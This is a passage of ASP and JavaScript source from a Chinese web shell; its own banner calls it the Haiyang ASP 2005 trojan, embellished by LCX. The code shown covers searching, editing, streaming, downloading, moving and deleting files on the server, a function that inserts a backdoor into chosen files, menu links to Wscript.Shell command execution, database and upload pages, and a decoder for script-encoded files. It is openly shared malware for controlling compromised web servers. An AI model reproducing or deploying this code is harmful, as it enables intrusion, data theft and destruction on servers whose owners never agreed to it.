			searchFolder theFolder,str
		next
	end sub
	
	function searchFile(f,s,title)
		dim fo,content,pos1,pos2
		set fo=fso.openTextFile(f)
		on error resume next
		content=fo.ReadAll()
		fo.close
		if err then
			err.clear
			content=""
		end if
		searchFile=instr(1,content,S,vbTextCompare)>0 
		if searchFile then
			pos1=instr(1,content,"<TITLE>",vbTextCompare)
			pos2=instr(1,content,"</TITLE>",vbTextCompare)
			title=""
			if pos1>0 and pos2>0 then
				title=mid(content,pos1+7,pos2-pos1-7)
			end if
		end if
		set fo=nothing
	end function
	
	function fileLink(f,title)
		fileLink=f.path
		if title="" then
			title=f.Name
		end if
		fileLink="<UL>·"&title&" "&fileLink&"</UL>"
	end function

	sub pageOther()
%>
<style>
	body{overflow:auto;border:0px;margin: 0px;padding: 0px;background-color:buttonface;}
	input {BORDER:#ffffff 1px solid;;FONT-SIZE: 12px;color: #000000;}
	.inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}
	textarea {BORDER: 1 1 1 1;FONT-SIZE: 12px;	color: #000000;}
	A:visited {FONT-SIZE: 9pt;COLOR: #333333;TEXT-DECORATION: none;}
	A:active {FONT-SIZE: 9pt;COLOR: #3366cc;TEXT-DECORATION: none;}
	A:link {FONT-SIZE: 9pt;COLOR: #000000;TEXT-DECORATION: none;}
	A:hover{font-weight: bold;background: silver;text-transform: capitalize;color: black;}
	.tr1{ BACKGROUND-color:gray }
	td {FONT-SIZE:9pt;FONT-FAMILY:"Tahoma","Arial","Helvetica","sans-serif";}
	.td1{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:silver;}
	.td2{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey;}
	.td3{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:gainsboro;}
	.table1{BORDER:gray 0px ridge;}
	.table2{BORDER:silver 0px ridge;}
	.showMenu{BORDER:silver 0px double;}
</style>
<script lanuage="javascript">
//页面上一些要用到的JS,Marcos编写.
function default_canLogin(frm){
	if(frm.password.value==""){
		alert("请先输入密码!");
		return false;
	}else{
		frm.Submit.disabled=true;
		return true;
	}
}

function stream_editIt(thePath){
	loaded.style.display="block";
	fileEditor.location.href="?pageName=stream&thePath="+thePath+"&theAct=edit";
}

function stream_downIt(thePath){
	loaded.style.display="none";
	if(confirm("如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先用FSO把文件复制到网站目录下,\n然后通过http协议来下载.\n按\"确定\"用流来进行下载.")){
		fileEditor.location.href="?pageName=stream&thePath="+thePath+"&theAct=down";
	}
}

function stream_saveAs(frm,thePath){
	if(frm.thePath.value=prompt('请输入要保存的文件的绝对路径!',thePath)){
		if(frm.thePath.value==null||frm.thePath.value==''){
			return false;
		}else{
			frm.submit();
		}
	}
}

function stream_saveAsTwo(thePath){
	var url;
	if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=stream&theAct=saveAsTwo&thePath="+thePath+"&toPath="+url;
		}
	}
}

function stream_moveTo(thePath){
	var url;
	if(url=prompt('请输入目标绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=stream&theAct=moveTo&thePath="+thePath+"&toPath="+url;
		}
	}
}

function fso_editIt(thePath){
	loaded.style.display="block";
	fileEditor.location.href="?pageName=fso&thePath="+thePath+"&theAct=edit";
}

function fso_saveAs(thePath){
	var url;
	if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=fso&theAct=saveAs&thePath="+thePath+"&toPath="+url;
		}
	}
}

function fso_delFile(thePath){
	if(confirm("确认要删除这个文件吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=delFile&thePath="+thePath;
	}
}

function fso_inject(thePath){
	if(confirm("确认要插入后门吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=inject&thePath="+thePath;
	}
}

function fso_delFolder(thePath){
	if(confirm("确认要删除这个目录吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=delFolder&thePath="+thePath;
	}
}

function upload_canSubmit(frm){
	if(frm.fileName.value==''){
		alert('请填写上传后的文件名!');
		return false;
	}else{
		if(frm.file.value==''){
			alert('请选择要上传的文件!');
			return false;
		}else{
			frm.action+='&fileName='+frm.fileName.value;
			frm.Submit.disabled=true;
			return true;
		}
	}
}

function showMenu(){
	if(top.location==location.href){
		menu.style.display="";
	}
}

//以下代码抄袭,不过忘记是从哪里抄的了,做过一点修改

var Words;
function SetWords(word){
	Words=word.value;
}

function SetNewWords(form){
	var NewWords;
	NewWords=unescape(Words);
	form.NewWords.value=NewWords;
}

function SetNewWords1(form){
	var NewWords;
	NewWords=escape(Words);
	form.NewWords.value=NewWords;
}
	function screncode(s,l){
	enc=new ActiveXObject("Scripting.Encoder");
	return enc.EncodeScriptFile("."+l,s,0,l+"cript");
}

var STATE_COPY_INPUT=100
var STATE_READLEN=101
var STATE_DECODE=102
var STATE_UNESCAPE=103

var pick_encoding=new Array(
	1,2,0,1,2,0,2,0,0,2,0,2,1,0,2,0,
	1,0,2,0,1,1,2,0,0,2,1,0,2,0,0,2,
	1,1,0,2,0,2,0,1,0,1,1,2,0,1,0,2,
	1,0,2,0,1,1,2,0,0,1,1,2,0,1,0,2
	)

var rawData=new Array(
	0x64,0x37,0x69,0x50,0x7E,0x2C,0x22,0x5A,0x65,0x4A,0x45,0x72,
	0x61,0x3A,0x5B,0x5E,0x79,0x66,0x5D,0x59,0x75,0x5B,0x27,0x4C,
	0x42,0x76,0x45,0x60,0x63,0x76,0x23,0x62,0x2A,0x65,0x4D,0x43,
	0x5F,0x51,0x33,0x7E,0x53,0x42,0x4F,0x52,0x20,0x52,0x20,0x63,
	0x7A,0x26,0x4A,0x21,0x54,0x5A,0x46,0x71,0x38,0x20,0x2B,0x79,
	0x26,0x66,0x32,0x63,0x2A,0x57,0x2A,0x58,0x6C,0x76,0x7F,0x2B,
	0x47,0x7B,0x46,0x25,0x30,0x52,0x2C,0x31,0x4F,0x29,0x6C,0x3D,
	0x69,0x49,0x70,0x3F,0x3F,0x3F,0x27,0x78,0x7B,0x3F,0x3F,0x3F,
	0x67,0x5F,0x51,0x3F,0x3F,0x3F,0x62,0x29,0x7A,0x41,0x24,0x7E,
	0x5A,0x2F,0x3B,0x66,0x39,0x47,0x32,0x33,0x41,0x73,0x6F,0x77,
	0x4D,0x21,0x56,0x43,0x75,0x5F,0x71,0x28,0x26,0x39,0x42,0x78,
	0x7C,0x46,0x6E,0x53,0x4A,0x64,0x48,0x5C,0x74,0x31,0x48,0x67,
	0x72,0x36,0x7D,0x6E,0x4B,0x68,0x70,0x7D,0x35,0x49,0x5D,0x22,
	0x3F,0x6A,0x55,0x4B,0x50,0x3A,0x6A,0x69,0x60,0x2E,0x23,0x6A,
	0x7F,0x09,0x71,0x28,0x70,0x6F,0x35,0x65,0x49,0x7D,0x74,0x5C,
	0x24,0x2C,0x5D,0x2D,0x77,0x27,0x54,0x44,0x59,0x37,0x3F,0x25,
	0x7B,0x6D,0x7C,0x3D,0x7C,0x23,0x6C,0x43,0x6D,0x34,0x38,0x28,
	0x6D,0x5E,0x31,0x4E,0x5B,0x39,0x2B,0x6E,0x7F,0x30,0x57,0x36,
	0x6F,0x4C,0x54,0x74,0x34,0x34,0x6B,0x72,0x62,0x4C,0x25,0x4E,
	0x33,0x56,0x30,0x56,0x73,0x5E,0x3A,0x68,0x73,0x78,0x55,0x09,
	0x57,0x47,0x4B,0x77,0x32,0x61,0x3B,0x35,0x24,0x44,0x2E,0x4D,
	0x2F,0x64,0x6B,0x59,0x4F,0x44,0x45,0x3B,0x21,0x5C,0x2D,0x37,
	0x68,0x41,0x53,0x36,0x61,0x58,0x58,0x7A,0x48,0x79,0x22,0x2E,
	0x09,0x60,0x50,0x75,0x6B,0x2D,0x38,0x4E,0x29,0x55,0x3D,0x3F
)

var transformed=new Array()
for (var i=0; i<3; i++) transformed[i]=new Array()
for (var i=31; i<=126; i++) for (var j=0; j<3; j++) transformed[j][rawData[(i-31) * 3+j]]=(i==31)?9:i
	var digits=new Array()
for (var i=0; i<26; i++){
	digits["A".charCodeAt(0)+i]=i
	digits["a".charCodeAt(0)+i]=i+26
}
for (var i=0; i<10; i++) digits["0".charCodeAt(0)+i]=i+52
digits[0x2b]=62
digits[0x2f]=63

function unescape2(char){
	var escapes="#&!*$"
	var escaped="\r\n<>@"
		if (char.charCodeAt(0) > 126) return char
	if (escapes.indexOf(char)!=-1) return escaped.substr(escapes.indexOf(char),1)
	return "?"
}

function decodeBase64(string){
	var val=0
	val+=(digits[string.substr(0,1).charCodeAt(0)]<<2)
	val+=(digits[string.substr(1,1).charCodeAt(0)]>>4)
	val+=(digits[string.substr(1,1).charCodeAt(0)]&0xf)<<12
	val+=((digits[string.substr(2,1).charCodeAt(0)]>>2)<<8)
	val+=((digits[string.substr(2,1).charCodeAt(0)]&0x3)<<22)
	val+=(digits[string.substr(3,1).charCodeAt(0)]<<16)
	return val
}

function strdec(encodingString){
	var marker="#@~^"
	var stringIndex=0
	var scriptIndex=-1
	var unEncodingIndex=0
	var char=null
	var encodingLength=unEncodinglength=0
	var state=STATE_COPY_INPUT
	var unEncodingString=""
	var re,arr
		while(state){
		switch (state){
			case (STATE_COPY_INPUT):
				scriptIndex=encodingString.indexOf(marker,stringIndex)
				if (scriptIndex!=-1){
					unEncodingString+=encodingString.substring(stringIndex,scriptIndex)
					scriptIndex+=marker.length
					state=STATE_READLEN
				}else{
					stringIndex=stringIndex==0?0:stringIndex
					unEncodingString+=encodingString.substr(stringIndex,encodingString.length)
					state=0
				}
			break
		case (STATE_READLEN):
			encodingLength=encodingString.substr(scriptIndex,6)
			unEncodinglength=decodeBase64(encodingLength)
			scriptIndex+=(6+"==".length)
			state=STATE_DECODE
			break
		case (STATE_DECODE):
			if (!unEncodinglength){
				stringIndex=scriptIndex+"DQgAAA==^#~@".length
				unEncodingIndex=0
				state=STATE_COPY_INPUT
				break
			}
			char=encodingString.substr(scriptIndex,1)
			if (char=="@") state=STATE_UNESCAPE
			else{
				if (char.charCodeAt(0)<0xFF){
					unEncodingString+=String.fromCharCode(transformed[pick_encoding[unEncodingIndex%64]][char.charCodeAt(0)])
					unEncodingIndex++
				}else{
					unEncodingString+=char
				} 
				scriptIndex++
				unEncodinglength--
				break
			}
		case STATE_UNESCAPE:
			unEncodingString+=unescape2(encodingString.substr(++scriptIndex,1))
			scriptIndex++; unEncodinglength -=2
			unEncodingIndex++
			state=STATE_DECODE
			break
		}
	}
		re=new RegExp("(JScript|VBscript).encode","gmi")
	while(arr=re.exec(unEncodingString)) unEncodingString=RegExp.leftContext+RegExp.$1+RegExp.rightContext
	return unEncodingString
}
</script>
<%
	end sub
	
	sub showMenu()
		if pageName="" or pageName="default" or pageName="login" then
			exit sub
		end if
		echo "<div style=""display:none;"" id=""menu""><TABLE class=""showMenu"" width=""100%""><tr><td>"
		echo "<a href=""?pageName=server"">Server</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=""?pageName=stream"">Stream</a>&nbsp;&nbsp;&nbsp;&nbsp;"
		echo "<a href=""?pageName=fso"">FSO</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=""?pageName=cmdShell"">Wscript.Shell</a>&nbsp;&nbsp;&nbsp;&nbsp;"
		echo "<a href=""?pageName=app"">Application</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=""?pageName=sql"">MS_DataBase</a>&nbsp;&nbsp;&nbsp;&nbsp;"
		echo "<a href=""?pageName=upload"">Other</a>"
		echo "</td><TD align=""right"">页面执行时间:约<font color='red'><b>"&((timer-startTime)/1000)&"</b></font>秒&nbsp;Powered By <b>騎牛追飛機</b>&nbsp;<a href=""#"" onclick=""parent.close()""><FONT face=""webdings"" color=red>r<font>&nbsp;</a></TD>"
		echo "</tr></TABLE></div><script language=""JavaScript"">showMenu();</script>"
	end sub
%>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<!-- 騎牛追飛機专用——QQ：138008880美化版-────────────────┐
│                                                               │
│  感谢你使用 海阳ASP2005木马_騎牛追飛機美化版 v1.0                  │
│  本代码完全公开和免费，你可以任意复制、传播、修改和使用，     │
│  但不得公开发表代码 不得用做商业用途，不得向其他使用者收费。  │
│                                                               │
│  使用时,请保留此段信息,谢谢配合.                              │
│                                                               │
│  警告: 不对使用本工具进行违法行为承担任何责任！               │
│                                                               │
│  作者：LCX 騎牛追飛機　ＱＱ：138008880                                      │
│                                       2004/12/15              │
│                                                               │
└───────────────────  騎牛追飛機 ─-->
